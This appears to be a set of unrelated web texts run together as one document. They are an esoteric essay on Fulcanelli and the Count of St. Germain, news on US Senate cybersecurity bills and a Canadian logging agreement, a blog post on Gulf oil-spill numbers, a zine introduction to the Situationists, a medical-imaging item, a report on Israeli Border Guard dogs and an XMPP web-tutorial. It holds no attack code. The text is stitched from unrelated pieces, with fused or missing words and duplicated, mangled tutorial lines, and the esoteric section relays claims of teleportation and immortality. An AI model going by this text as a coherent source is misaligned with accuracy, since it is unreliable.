What we know for sure about Fulcanelli is collected in his books Mysteries of the Great Cathedrals and The Philosophers ' Dwellings .
Apparently , he was conversant in the matter of the secret symbols employed among those " in the know " : " In the Middle Ages , the masters whose treatises have survived until our times would decorate their homes with esoteric signs and images " .
The reader is advised that one such symbol is that of a lion rampant and a dragon biting its own tail .
There is no dearth of " secret societies " to blame for the many coded messages in existence .
At one time or another , the culprits have ranged from the Illuminati to the Catholic Church .
The accusation ?
Being a cabal of dark " superminds " ruling the fate of a plodding , unsuspecting mankind .
Obviously , any group capable of sustained existence from the depths of antiquity to the present must surely be remarkable , if we consider the ups and downs of human history and the propensity of organizations to come unraveled -- unless we make the prodigious leap of faith that would lead us to accept that there could be " immortal " humans , or paranormal beings in human guise that guide the hidden groups throughout the ages .
A few characters fitting the bill come to mind : Apollonius of Tyana , a sorcerer / scholar from the city of Tyana in what is now modern Turkey .
If what tradition is to be credited , we are faced with a man who was capable of teleportation , was most certainly immortal or extremely long - lived , and who was a master of Pythagoric doctrine and geometry .
Apollonius traveled to Tibet led by his guide , Damis , arriving at a land of Greek - speaking people with an " unreal " , mutable landscape ( another dimension ? ) .
The dwellers of this hidden kingdom had mastered levitation , robotics and the artificial illumination .
The errant philosopher learned that this land existed " in the world , but beyond it " .
Returning to the Mediterranean area , then controlled by Rome , Apollonius was accused of treason against Emperor Domitian .
Brought before Caesar , Apollonius declared : " You may imprison my body , but never my soul , and I will add , not my body , either ! "
In a burst of light , witnessed by Roman courtiers and a stunned Domitian , the captive vanished into thin air .
In esoteric circles , it is believed to this day that Apollonius is the same entity known as the Count of Sainte Germain , who was active in the 1700's and was renown for his great wealth and insight .
Sainte Germain and Apollonius had certain powers in common : bilocation ( the ability to be in two places at the same time -- probably the ability most coveted by 21st century man ! ) , the power of healing the sick and the ability to decipher " the language of birds " .
Fulcanelli could be merely another guise of this everlasting being .
Even if we do not give credence to such an idea , it could perhaps answer the question as to who or whom is the source for the cryptic messages and codes hidden in works of art and architecture .
Furthermore , the years in which St. Germain operated were also those in which a number of scientific developments -- some which were never followed through - - became apparent .
He could have been the catalyst for the Enlightenment , as others have suggested .
Roger Boscovitch , in 1756 , circulated a tract on time travel , anti-gravity and bilocation , matters which are still unattainable to modern science .
James Price , who was reputedly able to change mercury into gold in less than 15 minutes , lived roughly around the same time .
Before he vanished from the 18th century , St. Germain allegedly informed a guest at a dinner party that he had to leave , in order to bring about more inventions that would be useful to humanity in the future : the steam engine and electricity .
It would be this " secret society " of inventors and experimenters , then , thatwould leave behind symbols and references that could only be understood by a peer or equal .
Lionel Fanthorpe , author ofhints that one of the items whose location could probably be hinted at by the coded symbols are the Emerald Tablets of Hermes Trismegistus , the Egyptian deity Thoth , patron of magic .
Possession of said tablets could have aided the medieval alchemists in attaining their goals .
History reminds us , however , that the alchemists were merely proto-scientists , and that their life - extending elixir and the Philosophers '
Stone were merely the stuff of dreams .
Yet , could some alchemists have stumbled upon the secrets , and made use of them ?
Fanthorpe suggests that these symbols are still in use today , and make sense , naturally , only to the target reader or viewer .
He considers the highly elaborate drawing of the Gates of Moria in J.R.R. Tolkien ' sto be one such device .
The reader might well feel cheated at this point -- we are no closer to solving the mystery of cryptic messages than we were at the outset .
Yet we are deluged by such messages , perhaps even more so in our television age , in which these mysterious communications could be broadcast subliminally to the intended receptors , or overtly –as we have seen -- through strange or unusual advertisements .
Salvador Freixedo received a personal communication from the sources behind the controversial UMMO documents -- a group of extraterrestrials allegedly on Earth , originating from the star Wolf 424 , nowadays thought to be a mere disinformation exercise -- and told to signal his interest in continuing communication with them by placing a classified ad in his local newspaper .
Freixedo went ahead and placed the ad , which contained the " Ummite " word for " man " ( ) .
To avoid hassles from the paper 's editor , Freixedo claimed that the unusual word was a brand of radionics machine !
If we bear in mind that such messages do exist , perhaps we will find ourselves giving everything , from odd TV commercials to the graffiti on our streets , a second thought .
Senate Working To Consolidate Cybersecurity Bills
Though legislative strategy for crafting a combined , comprehensive cybersecurity bill is n't yet clear
The Senate will work to combine a number of cybersecurity bills with an eye toward meeting the goal of majority leader Harry Reid , D - Nev. , of passing comprehensive cybersecurity legislation sometime this year , Senate staffers said Tuesday at a conference in Washington , D.C .
There is broad agreement between key Senate committees in terms of key elements that need to be included in any comprehensive legislation , Eric Hopkins , professional staff member for the federal financial management subcommittee of the Senate committee on homeland security and government affairs , said at the Symantec Government Symposium , but many details need to be worked out .
Olcott noted a number of themes common in both the Senate homeland security committee bill sponsored by Sens. Joseph Lieberman , I - Conn. , and Susan Collins , R- Maine , and the Senate commerce committee bill sponsored by Sens. John Rockefeller , W.V. , and Olympia Snowe , R - Maine , the two most prominent and comprehensive bills currently circulating .
Included in that list , he said , are reforms of the Federal Information Security Management Act , clarification of the role of the federal government in preventing cyber- attacks against privately - owned critical infrastructure , delineation of the proper roles of the White House and other agencies in managing cybersecurity within government , and measures to grown and improve the cybersecurity workforce .
The legislative strategy for crafting a combined comprehensive cybersecurity bill is n't yet clear , the staffers said .
However , there are literally dozens of cybersecurity bills bouncing around Capitol Hill , and , according to Olcott , Reid is looking to " bring in a lot of Senators with skin in the game , " meaning that whatever form the final legislation takes , it will be include the involvement of not just Sens .
Rockefeller , Snowe , Lieberman and Collins but others as well .
However , despite the urgency with which Congress has been dealing with cybersecurity as of late , when pressed , neither Hopkins nor Jacob Olcott , counsel with the Senate committee on commerce , science and transportation , would actually commit to getting a bill passed sometime this year .
" The intent is there to get something done , but obviously , Congress has a lot on its plate right now , " Hopkins said , raising the specter of the BP oil spill , the economy , and upcoming mid-term elections .
" What I do know is that , by working together , we can put something together that will be solid and hopefully wo n't require too much debate on the floor .
It 's not a partisan issue . "

OTTAWA ( Reuters ) - Most of Canada ’s largest forestry companies announced a groundbreaking deal with environmental groups on Tuesday that will restrict logging in the country ’s vast northern forests .

The agreement covers 170 million acres ( 690,000 square km ) -- an area nearly twice the size of Germany -- and ends years of battles over logging in Canada ’s massive boreal forest , which environmentalists say helps fight global warming by absorbing large amounts of carbon dioxide .
The forestry companies will stop all logging immediately on 75 million acres to protect woodland caribou herds under pressure from development .
The two sides will then spend three years working out which restrictions to impose on logging in the remaining 95 million acres .
In return , as the agreement comes into force , the green groups will end international “ Do not buy ” campaigns against Canadian lumber .
The deal took two years to negotiate .
“ This is the way everyone hoped the world could work .
Instead of fighting and having polarized discussions ... the way of succeeding tomorrow is going to be through constructive good faith engagement , ” said Avrim Lazar , chief executive of the Forest Products Association of Canada .
The U.S. - based Pew Environment Group , which brokered the deal , said it was the largest commercial forest conservation agreement ever concluded .
Lazar , saying the forestry industry had to modernize and become greener to thrive and win new markets , described the agreement as a business strategy .
“ We know where the future is ... we ’re doing this not just because we love the boreal , ” he told a news conference .
The deal includes forests in seven of the country ’s 10 provinces .
A similar agreement was reached four years ago to end a dispute over logging in the rainforest on Canada ’s Pacific Coast .
“ It really is a truce , after many years of fighting each other ...
This is our best and last chance to save woodland caribou in the boreal forest , ” said Richard Brooks of Greenpeace Canada .
The boreal forest region , which stretches across much of Canada , consists mostly of coniferous trees such as spruce , fir and pine , as well as large areas of lakes , rivers and wetlands .
In all it covers an area of 1.37 billion acres ( 5.7 million square km ) , of which 766 million acres are forested , with remaining regions made up of peat lands and treeless areas .
The deal won praise from the Communications , Energy and Paperworkers Union , whose members have been hit hard by the slump in the forestry industry .
“ It is time now to make environmental leadership a value - added advantage for Canadian forest products , ” union President Dave Coles said in a statement .
The green groups include Greenpeace , Canopy , the Nature Conservancy , ForestEthics , the David Suzuki Foundation and the Pew Environment Group .
Among the 20 firms involved are : Canfor Corp , Tembec , Tolko Industries , West Fraser Timber , Weyerhaeuser , Mercer International , Kruger Inc , AbitibiBowater and NewPage Corp .
There is one facet of the gulf oil spill that really puts it into context , but I have n’t seen anyone else mention this .
In his testimony before a House subcommittee , BP CEO Tony Hayward is on record as saying there could be 2 billion gallons of oil left in the well .
2 billion gallons of oil that could flood the Gulf of Mexico if it is n’t stopped .
There are 42 gallons to a barrel .
My shady - at - best math skills tell me that is around 47 million barrels of oil sitting down there .
The United States consumes 19.5 million barrels of oil .
A day .
It takes this country 2.4 days to consume the amount of oil that is left down there .
Estimations vary about how much has spilled out so far .
The official Department of Energy estimate is 35,000 barrels a day , or 1,845,681 barrels since this whole shindig started .
Correct me if I ’m wrong , but the total oil leaked so far is the equivalent to 2.3 hours of the USA ’s oil consumption .
I could ramble on about cutting energy consumption , yadda yadda yadda .
But I wo n’t .
Just look at the numbers .
Think about it for a while .

What ’s bad about political / intellectual elitism ?
It alienates everyone else from politics and critical thinking , rendering them powerless more effectively than any oppressive government could ever do .
The propaganda of network TV is not more responsible for the apathy of the mainstream Westerner than the average radical leftist is .
Those for whom being “ political ” and “ educated ” has become an identity , who use these terms to define themselves as a certain type of person , thus make others think that politics and radical thinking are the hallmark of a certain group of people ( a drab and haughty group , at that ) , no more , and marginalize themselves from the rest of the world which so badly needs some of their ideas — but not their scornful “ specialism , ” not their divisionary attitudes and identities .
One of the Situationists ’ chief goals was to fight this conception of the self according to roles played in present society ( i.e. intellectual professor , indifferent bricklayer , student radical ) , so it ’s ironic to see them used everywhere now by people who want to assert their status as members of the high political elite .
Everywhere I turn now ( Refused and other band lyrics and slogans , the AK Press catalog , and an even worse piece in Adbusters ) I see the terms ( which , since the academic language they used is n’t common , are already exclusive and exclusionary ) thrown about — spectacle , detourn , derive , etc. — and the ideas misused and misrepresented by individuals who obviously have read little or none of the original texts but hope only to be impressive by citing the “ latest ” in hyper-radical /- intellectual French underground thinkers .
To combat this sort of thing , which ghettoizes thinkers who had ideas relevant to everyone to the most “ sophisticated ” of armchair revolutionary coffee - table discussions and college historical studies ( which are always about putting ideas in the museum / mausoleum , rather than bringing them to new life ) , a straightforward , accessible , user - friendly introduction is in order .
In the punk community ( my thinking is that each of us travels in a few different communities , in which they know something about the needs of the people around them and can thus figure out how to act in everyone ’s best interest ) that should take the form of an article , in a widely read ‘ zine like Inside Front .
Unfortunately , and honesty is always the best policy on these things ( though a part of me would love to set up a smokescreen and just plow through this article with no regard for content , quality , clarity or responsibility ) I have to admit something to you , dearest readers of Inside Front : it ’s five in the morning , I ’ve slept two hours a night for two weeks , I just moved out of the last house I will stay in for at least twelve months , the article is due in three hours before we leave for a ten hour drive , and I ’m too fucking exhausted to write the lengthy , detailed introduction you deserve .
The more I think about it , the more I realize it could be a fucking book and still not be complete , anyway .
But you ’re all smart kids , so our “ Introduction to the Situationists ” need not be more than a suggestion that you track down the original texts yourself .
It would be much better for you to do the reading yourself and pursue the stuff that interests you , anyway , than to just soak up a watered - down version here .
Still , let me offer a tiny bit of background .
The Situationist Internationale started as a group of artists in the late 1950 ’s , from a number of different nations , publishing together a magazine critiquing modern society in its various economic / social / political aspects , and meeting periodically to discuss and further refine their theory .
They wanted to bring Marxism up to date , to construct a theory of what was going on in society that was preventing people from being able to live fully and act freely .
The result was a critique that centered around everyday life , what happens to people and what they do on a daily basis , rather than abstract economic forces etc .
The idea of the “ Spectacle , ” the empty roles and values and passive rituals that modern life perpetuates ( and vice versa ) , was at the heart of this .
The Situationists were characterized by a healthy opposition to ideologies , too , and denied that there was such a thing as “ Situationism , ” doing their best to fight off the stultifying , paralyzing effects of dogma and party line .
Early on , there was also a lot of interest in such topics as geography : how could cities be designed so they would bring the most pleasure to their inhabitants , rather than just being created randomly by “ market forces ” that people think of as beyond their control ( when actually it is their actions that create these forces ) ?
To pursue such questions , Situationists would go on extended “ derives ” : wanderings through environments designed to explore their psychological conditions .
Another commonly - referred - to Situationist idea from that era is detourning : to detourn is to take an old art work , form , or formula that has a prescribed meaning in society , and , by adding some new element to it , bring out its “ true ” meaning : an example would be re-titling a “ Dilbert ” cartoon “ Despair . ”
( You can probably imagine how that works . )
Eventually there was a falling out between the artists and the more purely radical members , who saw no hope of real art being made until after a full scale social revolution — or at least in the act of that revolution itself .
Anything less was treading water , in their eyes , keeping the farce of capitalist , alienating , uncreative life afloat for one more miserable day .
The artistic faction left , and the remaining group became more and more involved in perfecting their critique .
In the late ‘ 60 ’s , a student group influenced by their ideas pulled some clever stunts at their university , which eventually escalated into the events of May 1968 , in which the French government was quite nearly overthrown : workers joined students in a full - scale , national strike , fighting police and riot squads in the streets , refusing to recognize any authorities , asking questions in every corner of society that were usually quarantined to the radical sector … non -stop discussions were held about how a new , truly democratic society could be formed , and for a month the fate of humanity seemed up in the air .
Finally , the labor unions sold the struggle out by negotiating merely higher wages , and everyone went back to work as if nothing had happened ; but that month stands as evidence of how much dissatisfaction there is in the modern world , and how it can rise to the surface under the right conditions .
They do n’t teach us about May 1968 in U.S. schools because they do n’t want us to know that such things are possible .
Most of the ideas in Inside Front are Situationist - influenced : the emphasis on how you spend your real - life time ( rather than what abstractions you pledge allegiance to ) , how time and space are formed and controlled by the ways our present system forces us to interact , what the effects of other systems of interaction might be , all that goes back to them ( and beyond , of course ) .
The Situationists saw themselves the same way the CrimethInc. ‘ workers ’ see ourselves , as full - time ( neither part - time nor professional ) revolutionaries , with an immediate stake in things changing and no interest in getting too comfortable in the role of dissenting outsiders .
Many of the slogans you see so many bands and ‘ zines use ( even this one ) were Situationist slogans .
Their influence is everywhere in our underground .
That by itself is not so significant , but the fact that in their analyses of the same things we ’re thinking about in hardcore punk today ( consumerism , socialized roles , issues of economic exploitation and oppression , etc. ) they went so much farther than most of us have yet is important .
If you ’re interested in ideas you read in magazines like Inside Front , one of the next places you could go to get more ideas and inspirations is the Situationists and their texts .
Do n’t be too intimidated by the cliquish more - anarchist - than - thou guy at your local bookshop who claims to know Society of the Spectacle backwards in Greek ; they might really have something practical to offer you for your life .
Reading :
These are the books I have sitting around me as I write this :
Society of the Spectacle by Guy Debord ( Black and Red , Detroit ) —
This starts out terrifying ( insofar as it ’s so abstract and theoretical that it seems to be talking about nothing , as well as being absurdly academic and dry as toast ) , but gets a little clearer as you proceed .
If you ’re going to try to learn about this stuff at all , you should eventually give it a shot , since this is one of the most central and important books to come from the Situationists ; but go slowly , and with patience …
The Revolution of Everyday Life by Raoul Vaneigem ( Rebel Press / Left Bank Books ) —
This book is equally academic and frustrating in places , but in place of Society ’s blankfaced inhuman approach it is filled with the sort of passion for life and experience that Refused brought to the fore in their politics .
That makes it a lot more likable , and perhaps more dangerous in the hands of young , romantic punk kids , since the insight is no less here than in Debord ’s book — in my opinion , at least .
What is Situationism ?
A Reader edited by Stewart Home ( AK Press ) —
This is the sort of second - hand rehash that everyone is reading .
The title is a slap in the face to those of us who thought the anti-ideology aspect of the Situationist “ platform ” was among their most revolutionary ideas .
There are some great insights and leads to follow in here , but there ’s some shit as well … and even a little tiny bit of radical infighting , egotism , and careerism too , inevitably .
Look past it and you ’ll find , in small doses , some of the clearer summaries of and reflections on Situationist ideas and influences that you can get anywhere .
Guy Debord - Revolutionary by Len Bracken ( Feral House ) —
This is by far my favorite critical / historical work on the Situationists .
It covers a lot of the theory , with enough clarity and simplicity that it ’s accessible ( thank god ) , while also telling the life history of one of the people at the center of the whole thing .
That combination of abstract ideas with factual events that played out in reality makes the stuff in here seem humanly relevant as well as theoretically right on .
Yeah , this is a good book !
Enrages and Situationists in the Occupation Movement , France , May ‘ 68 by RenŽ Vienet ( Rebel Press ) —
This is a blow by blow historical account , written by an insider from the radical core of the struggle , of what happened before and during the events of May 1968 in Paris and France in general .
If you ’re interested in seeing how the ideas we ’re talking about here played out in practice , this is what you want to read … plus , it ’s filled with photos of graffiti , great slogans like “ Live without dead time ! ” that have been ripped off a thousand times in the past decade .
There ’s an anthology of articles from the Situationist Internationale journal and similar writings , translated by Ken Knabb ( Bureau of Public Secrets ) , that has real value if you want to read these guys in their own words , too .
To learn more about the artistic aspect of what they were doing , especially early on ( and I think this is the most overlooked aspect of the Situationists , and wrongly so ) , you might be able to go to a university art library and look for catalogs from retrospective exhibitions , etc .
If you ’re interested in this stuff and want to go into any more depth , but ca n’t find the resources , just write us and we ’ll photocopy or steal you more stuff .
Getting a good look at a person ’s guts without slashing through skin is n’t easy .
Radiologists use computed tomography to capture thin - slice images of our insides , but then they have to envision how those 2 - D x-rays fit together .
It ’s like looking at slices of bread and imagining the loaf .
But help is on the way from an unlikely source : kid flicks .
UCSF radiologist Richard Breiman — working with 3 - D technology developed by
imaging company Fovia — was able to combine those bread slices using volume rendering .
It ’s roughly the same software trick that enables Pixar , the
studio behind Toy Story and most of the other blockbusters children are obsessed with .
1 Breiman can assemble images that are viewable from any angle , and even manipulate the picture , gamer style — spin it around or animate it for , say , a flight through the colon .
( Bet you ca n’t do that in Assassin ’s Creed 2 . )
Eventually , Breiman says , doctors might be able to just program the scans into robot surgeons and let their steady hands do the work .
Paging Dr. Wall - E …
Note 1 . Richard Breiman is working with 3 - D technology developed by the imaging company Fovia , not Pixar as a previous version of this story suggested .
Leftist protestors and Palestinian residents are already quite familiar with tear gas , stun grenades and even rubber bullets , but on Friday they were in for a surprise : Dogs .
Security forces arrived near the village of Dir Nizam in the Binyamin area accompanied by the Border Guard 's canine unit .
" They chased us with vicious dogs , " one of the protestors told Ynet .
Violence Palestinian shot at in Naalin says being persecuted Ali Waked Residents of Bil 'in say IDF raid to arrest Ashraf Abu - Rahma was attempt to keep him from pressing charges against soldier , officer who fired at him Palestinian shot at in Naalin says being persecuted
However , security officials say the new tactic helped spot and detain stone throwers .
" The dogs help us apprehend people without hurting them .
They are not attack dogs – they are patrol dogs trained to use their sense of smell and vision to conduct short chases , pinning the suspects to the ground until the soldiers arrive . "
The Border Guard 's Canine Unit includes a small number of fighters and Belgian Malinois Shepherd dogs , which are purchased in Europe and go through a prolonged training period alongside an assigned officer .
The training course includes discipline , taming , chasing after suspects , and searching structures , open areas and forested areas in all weather conditions .
The " pooches " are also trained to pass through difficult obstacles , noises and live fire .
The training period can last between three to five months , after which the dog and its accompanying officer go through an obstacle course that prepares them for operational activity .
The canine unit was deployed in the Binyamin area for the first time Friday , and the soldiers said they were pleased with the new addition .
" They make the job more efficient and minimize the risk of hurting people , " one soldier said .
However , protestors were enraged by the new enforcement method and said it constituted a dangerous escalation .
" The IDF wants to set dogs on us , which reminds us of a dark time in the history of the Jewish people , " onen protestor said .

The Extensible Messaging and Presence Protocol ( XMPP ) is an XML - based set of technologies for real - time applications , defined as networked applications that continually update in response to new or changed data .
It was originally developed as a framework to support instant messaging and presence applications within enterprise environments .
In this tutorial you will build Pingstream , a simple tool that continually updates itself with RSS feed updates as they are published ( Pingstream source code : pingstream.zip ) .
Along the way you will :
Learn why XMPP is particularly suited to web applications
Learn about the components of XMPP communication
Install and configure the Openfire XMPP server
Connect to the XMPP server using PHP and the XMPPHP library
Check for new items in an RSS feed and transmit them over XMPP
Use Strophe and jQuery to connect to an XMPP server over HTTP using Bidirectional - streams Over Synchronous HTTP ( BOSH )
Display XMPP notifications in a web page
Prerequisites
This tutorial assumes that you have some familiarity with developing web applications in PHP , although little advanced programming is involved .
You should also have some experience with HTML and JavaScript .
Experience with the jQuery JavaScript framework might be handy .
No prior familiarity with XMPP or similar technologies is required .
To follow along with this tutorial , you must have the following server software installed and running :
PHP 5.2 or higher
Apache HTTP Server
MySQL
As you progress through the tutorial , you will also download and install the following software and libraries :
Openfire
jQuery
Strophe
XMPPHP
Last RSS
You might also find the MySQL server tool phpMyAdmin useful .
If you are using a desktop machine to test your real - time web application software locally , you might find XAMPP useful for managing the installation and running of a test web server infrastructure .

Introducing the real - time web
In this section , you ’ll learn what real - time web applications are , why you might want to build one , and how they differ from the typical model for modern web applications .
Taking input and providing feedback
Real time on and off the web A better term than real - time web application is continually updating web application .
In computer science , both hard and soft real - time systems must meet operational deadlines .
A hard real - time system fails when a task does n’t complete in the time allotted to it .
Real - time web applications are closer to soft real - time systems , in which the lateness of a function does n’t result in a failure of the system ( but might degrade performance ) .
But you do n’t strictly assign task scheduling to a real - time web application .
The web is not , currently , an appropriate platform for time - critical applications .
Applications are pieces of specialized software that help users perform tasks .
Characteristically , they take input from the user or other sources and provide human - readable output .
They might also respond dynamically — in a visual or programmatic way — to changes in input data that ’s received automatically .
For example , a news - monitoring application might notify the user if a news story containing a particular keyword appears in a newswire that the application connects to .
Because of its origins as a document - serving platform , the web is not optimized for applications .
HTML is great for representing and hyperlinking text content , but not for creating dynamic interfaces .
Web applications can accept and respond to user input , thanks to the combination of server - side scripting languages such as PHP and simple web - input technologies such as forms and JavaScript .
But you must overcome some hurdles to create interfaces that update automatically .
This is a more difficult problem because no front - end web technology has been developed with this functionality in mind .
In contrast ( taking the news - monitoring example ) , desktop software does n’t need to refresh its interface for notifications to be delivered to the user ; it can continually update itself .
The web , on the other hand , is bound to a page - based model .
Nonetheless , real - time web - based applications are possible , and their benefits are clear .
Such applications include enterprise chat , networked real - time document collaboration , and search interfaces that reveal new content as soon as it ’s published .
Web technologies for robust application development
Typically , web applications simulate continually updated interfaces by using Asynchronous JavaScript and XML ( Ajax ) to poll a server frequently .
In this model , the application ’s web page contains JavaScript , which makes repeated requests to a server callback in the background .
Although the responsiveness of Ajax applications is adequate in many situations , this technique has drawbacks .
Ajax does not fare well with unreliable Internet connectivity : a temporarily dropped connection can cause the whole interface to fail .
It is also inefficient in terms of server load .
Suppose your background Ajax polling function checks the server every 10 seconds .
Each time , a new HTTP connection is established , including initialization of the resources needed to service the request , even if there ’s no new data to present to the user .
The result is an application that uses considerably more processor time and bandwidth than it needs to .
XML - based technologies provide significant advantages to web - scale applications .
XML parsers are now a standard part of most environments ; no extra software is required to support the reading and writing of data in a suitable format .
XML is self - describing ; documents that use it do not require an external schema .
Finally , just as the web is platform - independent , XML as a technology is interoperable among platforms .
As a result , developers can concentrate on the logic specific to their applications .
The web is built on free , interoperable , open standards such as HTML , Cascading Style Sheets ( CSS ) , and JavaScript .
If a standard is to emerge for real - time communication on the web , it too should be open , interoperable , and free .
XMPP , which is based on XML , meets these criteria .
In this tutorial , you will use it to build a client library that accepts input through standard methods ( for example , a web hook ) and relays the appropriate data to the user in real time .
Introducing XMPP
In this section , you ’ll look at XMPP , its origins , and why it is a suitable protocol for real - time web communications .
You will examine the components of an XMPP communication setting , and review some examples of how these can be used .
Web standards and XMPP
XMPP is an XML - based set of technologies for real - time applications .
It was originally developed as a framework to support instant messaging and presence applications within enterprise environments .
At the time , the existing instant - messaging networks were proprietary and largely inappropriate for enterprise use .
AOL Instant Messenger , for example , could not be adapted for secure communications inside a company .
Although commercial solutions existed , their fixed feature sets typically could not be adapted to meet an organization ’s needs .
XMPP , then called Jabber , allowed organizations to build their own custom tools to facilitate real - time communication , as well as install ready - made third - party solutions .
XMPP is a decentralized communication network , which means that any XMPP user can message any other XMPP user , network infrastructure permitting .
XMPP servers can also talk to one another with a specialized server - to - server protocol , providing interesting potential for decentralized social networks and collaboration frameworks , although that is beyond the scope of this tutorial .
As its name suggests , XMPP can be used to meet a wide variety of time - sensitive feature requirements .
Indeed , Google Wave , a large multiuser collaboration environment , uses XMPP as the basis for its federation protocol .
Although XMPP emerged from a requirement for person - to - person instant messaging , it is by no means limited to that task .
The structure of XMPP communication
To facilitate message delivery , each XMPP client user must have a universally unique identifier .
For legacy reasons , these are referred to as Jabber IDs , or JIDs .
Because of the protocol ’s distributed nature , it ’s important that a JID contain all the information required to contact a user : no central repository links users to the servers they connect to .
The structure of a JID is similar to an email address ( although there is no requirement for a JID to double as a valid email recipient ) .
Both client and server nodes , which I refer to collectively as XMPP entities , have JIDs .
John Doe , an employee at SomeCorp , might have the JID John.Doe@somecorp.com .
Here , somecorp.com is the address of the XMPP server for SomeCorp , and John .
Doe is the username for John Doe .
JIDs can also have a resource attached to them .
These allow for further addressing granularity beyond an identifier for an XMPP entity ; for example , whereas the preceding example can represent John Doe in totality , John.Doe@somecorp.com / Work might be used to send data to his work - related tools .
These resources can take any user - defined name , and an XMPP entity can have any number of resources .
As well as being context - dependent , they can be bound to a device , tool , or workstation .
For your Pingstream example , each visitor to the website will log into the XMPP server as the same user but have different resources .
Categories of communication
A real - time messaging system using XMPP comprises three broad categories of communication :
Messaging , wherein data is transferred between parties
Presence , which allows users to broadcast their online status and availability
Info / query requests , which allow an XMPP entity to make a request and receive a reply from another entity
These are complementary .
For example , there ’s often no point sending data to a user , or making an info / query request of an entity , if the user or entity is offline ( although in many use cases it is desirable for the server to hold messages for users until they return ) .
Each of them is delivered through a complete XML stanza — a discrete item of information expressed in XML .
XMPP stanzas of all three types have the following attributes in common :
from :
The JID of the source XMPP entity ’
: The JID of the source XMPP entity ’ to : The JID of the intended recipient
: The JID of the intended recipient id :
An optional identifier for the conversation
: An optional identifier for the conversation type : Optional subtype of the stanza
: Optional subtype of the stanza xml:lang :
If the content is human - readable , description of the message ’s language
Data transfer over XMPP takes place over XML streams , operating on port 5222 by default .
These are effectively two complete XML documents , each corresponding to a direction of communication .
Once a session is established , the stream element is opened .
It will envelop the entire communication document .
The stanzas are then injected into the second level of the document .
Finally , once communication ends , the stream element is closed , forming a complete document .
For example , Listing 1 shows a stream element establishing communication from the client to the server :
Listing 1 . Stream tag establishing communication from client to server
< stream : stream from= " [ server ] " id= " [ unique ID over conversation ] " xmlns= " jabber:client " xmlns : stream = " http://etherx.jabber.org/streams " version = " 1.0 " >

Messages
Once communication is established , the client can send a message to another user with the message element , which can contain any of the following child elements :
subject : A human - readable string representing the message topic .
: A human - readable string representing the message topic .
body :
A human - readable string representing the message body .
Multiple body tags can be included , if each one has a different xml:lang value .
( xml:lang is the only possible attribute . )
: A human - readable string representing the message body .
Multiple body tags can be included , if each one has a different value .
( is the only possible attribute . ) thread :
A unique identifier representing a message thread .
Client software can then use this to string together related messages .
However , messages can be as simple as the one in Listing 2 :
Listing 2 . Sample message
< message from=" sendinguser@somedomain " to =" recipient@somedomain " xml:lang='en '> < body >
Body of message </ body > </ message >

Message stanzas are the most useful stanzas for providing real - time web interfaces .
The publish - subscribe model — an alternative to using messages to transmit data in real - time web applications — is described next .
Info /query
Info / query stanzas can have a wide variety of functionality .
One example is the publish - subscribe model , wherein a publisher notifies the server of updates to a particular resource , and the server in turn notifies all XMPP users who have opted to subscribe to these notifications and are authorized to do so .
A series of items from the publisher are encoded as stanzas in the Atom XML - based publishing format .
Each item is contained within an item element , then collectively within a pubsub element , and finally as an info / query stanza .
In Listing 3 ( taken from the XMPP publish - subscribe specification ) Shakespeare ’s Hamlet ( with JID hamlet@denmark.lit /blogbot ) is publishing an update to the pubsub .
shakespeare.lit pubsub update node with his famous soliloquy :
< iq type = " set " from =" hamlet@denmark.lit /blogbot " to =" pubsub.shakespeare.lit " id =" pub1 " > < pubsub xmlns= " http://jabber.org/protocol/pubsub " > < publish node= " princely_musings " > < item > < entry xmlns= " http://www.w3.org/2005/Atom " > < title > Soliloquy < / title > < summary >
To be , or not to be : that is the question :
Whether 'tis nobler in the mind to suffer
The slings and arrows of outrageous fortune , Or to take arms against a sea of troubles , And by opposing end them ? </ summary > < link rel=" alternate " type = " text / html " href= "

Info / query stanzas are also used to request information about a particular XMPP entity .
For example , in the stanza in Listing 4 , boreduser@somewhere is looking for public items owned by friendlyuser@somewhereelse :
Listing 4 .
User looking for public items owned by friendlyuser@somewhereelse
< iq type = " get " from=" boreduser@somewhere " to=" friendlyuser@somewhereelse " id=" publicStuff " > < query xmlns= " http://jabber.org/protocol/disco#items " /> </iq >
Show more
Show more icon
In turn , friendlyuser@somewhereelse responds with a list of items that can be subscribed to using publish - subscribe , as in Listing 5 :
Listing 5 . Response with a list of items
< iq type =" result " from=" friendlyuser@somewhereelse " to=" boreduser@somewhere " id=" publicStuff " > < query xmlns= " http://jabber.org/protocol/disco#items " > < item jid=" stuff.to.do " name =
" Things to do " /> < item jid=" stuff.to.not.do " name =
" Things to avoid doing " /> </ query > </iq >
Show more
Show more icon
Each item returned in the result info / query stanza in Listing 5 has a JID that can be subscribed to .
Info / query stanzas also allow for a wide variety of server information requests that are outside the scope of this tutorial .
Many of them are useful in a web application context for multiserver environments , or as the basis of sophisticated decentralized collaboration frameworks .
Presence
Presence information is contained within a presence stanza .
If the type attribute is n’t present , the XMPP client application assumes that the user is online and available .
Otherwise , type can be set to unavailable , or to the pubsub - specific values subscribe , subscribed , unsubscribe , and unsubscribed .
It can also be an error or a probe for the presence information of another user .
A presence stanza can contain the following child elements :
show :
A machine - readable value indicating the overall category of online status to display .
This can be away ( temporarily away ) , chat ( available and interested in communication ) , dnd ( do not disturb ) , or xa ( away for an extended time ) .
: A machine - readable value indicating the overall category of online status to display .
This can be ( temporarily away ) , ( available and interested in communication ) , ( do not disturb ) , or ( away for an extended time ) .
status : A human - readable counterpart to show .
The value is a user - definable string .
: A human - readable counterpart to show .
The value is a user - definable string .
priority :
A numeric value between - 128 and 127 that defines the priority by which messages should be routed to the user .
If the value is negative , messages for the user are held .
For example , the boreduser@somewhere might use the stanza in Listing 6 to indicate a willingness to chat :
Listing 6 . Sample presence notification
< presence xml:lang= " en " > < show > chat </ show > < status > Bored out of my mind </ status > < priority >1</ priority > </ presence >
Show more
Show more icon
Note the absence of a from attribute .
Another user , friendlyuser@somewhereelse , might probe the status of boreduser@somewhere by sending the stanza in Listing 7 :
Listing 7 .
Probing a user ’s status
< presence type= " probe " from=" friendlyuser@somewhereelse " to=" boreduser@somewhere " />
Boreduser@somewhere 's server would then respond with a tailored presence response : < presence xml:lang= " en " from=" boreduser@somewhere " to=" friendlyuser@somewhereelse " > < show > chat</ show > < status > Bored out of my mind </ status > < priority >1</ priority > </ presence >
Show more
Show more icon
These presence values derive from person - to - person messaging software .
It is n’t clear how the value of the show element — normally used to determine a status icon to display to other users — is used apart from a literal chat application .
Status values might find use in microblogging tools ; for example , changes to the status field of a user in Google Talk ( an XMPP chat service ) can optionally be imported as microblog entries in Google Buzz .
Another possibility is to use status values as carriers for per-user application state data .
